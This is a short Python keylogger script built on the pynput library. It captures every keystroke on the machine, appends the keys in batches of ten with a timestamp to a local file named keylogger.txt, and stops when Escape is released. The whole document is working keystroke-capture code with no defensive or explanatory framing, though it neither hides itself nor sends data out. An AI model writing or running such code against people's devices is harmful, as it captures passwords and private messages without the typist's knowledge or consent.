from pynput import keyboard
import time

t = time.localtime()

count, keys = 0, []

def log_2_file(keys):
    with open("keylogger.txt", "a") as log_file:
        for key in keys:
            log_file.write("Date and time: " + time.asctime(t) + " " + "Key Pressed: " + str(key) + "\n")
            log_file.flush()
        log_file.write("\n")
            
def key_pressed(key):
    global keys, count

    keys.append(str(key))
    count += 1
    
    if count == 10:
        log_2_file(keys)
        count, keys = 0, []             

def key_released(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=key_pressed, on_release=key_released) as loop:
    loop.join()